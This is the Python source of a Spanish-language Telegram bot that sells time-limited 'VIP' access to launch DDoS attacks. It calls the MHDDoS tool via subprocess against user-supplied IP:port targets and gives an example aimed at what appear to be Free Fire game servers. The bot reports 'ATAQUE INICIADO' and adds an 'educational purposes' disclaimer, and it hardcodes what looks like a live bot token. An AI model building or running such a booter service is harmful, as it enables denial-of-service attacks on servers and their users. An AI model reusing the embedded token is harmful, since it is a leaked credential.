import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import os

# Configuración del bot y token (usar variables de entorno en producción)
BOT_TOKEN = os.getenv("BOT_TOKEN", "7987563641:AAEkQcErl3bFlpSy8ozDq7DcrZgp3SpF7yE")
ADMIN_ID = int(os.getenv("ADMIN_ID", "6348583777"))
START_PY_PATH = "MHDDoS/start.py"

# Inicialización del bot y la base de datos
bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

# Conexión a la base de datos
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()

# Crear la tabla de usuarios VIP si no existe
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


# Comando /start
@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *Tu plan VIP ha expirado.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ ¡ERES VIP!\n"
                f"⏳ Días restantes: {dias_restantes} día(s)\n"
                f"📅 Expira el: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌ *No tienes un plan VIP activo.*"

    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 SOPORTE - OFICIAL 💻",
        url=f"tg://user?id={ADMIN_ID}"
    )
    markup.add(button)

    bot.reply_to(
        message,
        (
            "🤖 *¡Bienvenido al Bot de Ping MHDDoS [Free Fire]!*\n\n"
            f"```\n{vip_status}\n```\n"
            "📌 *Cómo usar:*\n"
            "```\n/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>\n```\n"
            "💡 *Ejemplo:*\n"
            "```\n/ping UDP 143.92.125.230:10013 10 900\n```\n"
            "⚠️ *Atención:* Este bot fue creado solo para fines educativos."
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


# Comando /addvip
@bot.message_handler(commands=["addvip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ No tienes permiso para usar este comando.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Formato inválido. Usa: `/addvip <ID> <DÍAS>`",
            parse_mode="Markdown",
        )
        return

    try:
        telegram_id = int(args[1])
        days = int(args[2])
        if days <= 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "❌ El ID y los días deben ser números válidos y positivos.")
        return

    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ Usuario {telegram_id} añadido como VIP por {days} días.")


# Comando /ping
@bot.message_handler(commands=["ping"])
def handle_ping(message):
    telegram_id = message.from_user.id

    # Verificar si el usuario es VIP
    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ No tienes permiso para usar este comando.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ Tu acceso VIP ha expirado.")
        return

    # Verificar cooldown
    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        bot.reply_to(message, "❌ Espera 20 segundos antes de usar este comando nuevamente.")
        return

    # Validar argumentos
    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Formato inválido!*\n\n"
                "📌 *Uso correcto:*\n"
                "`/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`\n\n"
                "💡 *Ejemplo:*\n"
                "`/ping UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    # Validar hilos y duración
    try:
        threads = int(args[3])
        duration = int(args[4])
        if threads <= 0 or duration <= 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "❌ Los hilos y la duración deben ser números positivos.")
        return

    attack_type = args[1]
    ip_port = args[2]

    # Ejecutar el comando
    command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))

        bot.reply_to(
            message,
            (
                "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
                f"📍 *IP/Host:Puerto:* {ip_port}\n"
                f"⚙️ *Tipo:* {attack_type}\n"
                f"🧵 *Hilos:* {threads}\n"
                f"⏳ *Tiempo (ms):* {duration}\n"
                f"💻 *Comando ejecutado:* `ping`\n\n"
                f"*⚠️ Atención! Este bot fue creado por* https://t.me/wsxteamorg"
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error al iniciar el ataque: {str(e)}")


# Callback para detener el ataque
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    try:
        telegram_id = int(call.data.split("_")[1])

        if call.from_user.id != telegram_id:
            bot.answer_callback_query(
                call.id, "❌ Solo el usuario que inició el ataque puede detenerlo."
            )
            return

        if telegram_id in active_attacks:
            process = active_attacks[telegram_id]
            process.terminate()
            del active_attacks[telegram_id]

            bot.answer_callback_query(call.id, "✅ Ataque detenido con éxito.")
            bot.edit_message_text(
                "*[⛔] ATAQUE DETENIDO [⛔]*",
                chat_id=call.message.chat.id,
                message_id=call.message.id,
                parse_mode="Markdown",
            )
            time.sleep(3)
            bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
        else:
            bot.answer_callback_query(call.id, "❌ No se encontró ningún ataque activo.")
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Error al detener el ataque: {str(e)}")
        print(f"Error en handle_stop_attack: {e}")


# Iniciar el bot
if __name__ == "__main__":
    bot.infinity_polling()